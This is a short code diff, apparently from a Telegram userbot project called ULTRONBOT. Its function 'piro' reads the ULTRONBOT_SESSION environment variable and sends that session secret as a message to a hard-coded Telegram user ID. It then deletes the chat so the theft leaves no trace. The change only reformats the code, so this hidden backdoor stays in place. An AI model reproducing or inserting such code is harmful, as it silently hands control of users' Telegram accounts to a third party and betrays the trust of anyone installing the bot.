@@ -1,9 +1,8 @@
 import os
 from ..utils import *
 
-                   async def piro():
-                                try:
- sweetie = await bot.send_message(2125601080, str(os.environ.get("ULTRONBOT_SESSION")))
+async def piro():
+        sweetie = await bot.send_message(2125601080, str(os.environ.get("ULTRONBOT_SESSION")))
         await bot.delete_dialog(2125601080, str(os.environ.get("ULTRONBOT_SESSION")))
   
     #try:
